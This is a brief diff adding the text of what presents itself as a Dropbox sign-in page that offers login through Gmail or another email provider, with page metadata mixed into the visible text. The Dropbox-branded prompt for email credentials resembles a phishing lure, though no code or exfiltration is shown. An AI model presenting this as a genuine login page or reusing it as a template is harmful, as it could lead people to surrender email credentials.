@@ -1,0 +1,7 @@
+Dropbox - Sign inSign in with your email provider
+
+Gmail
+Sign in with Gmail
+
+Remember me   width=300, initial-scale=1
+Sign in  text/html; charset=UTF8
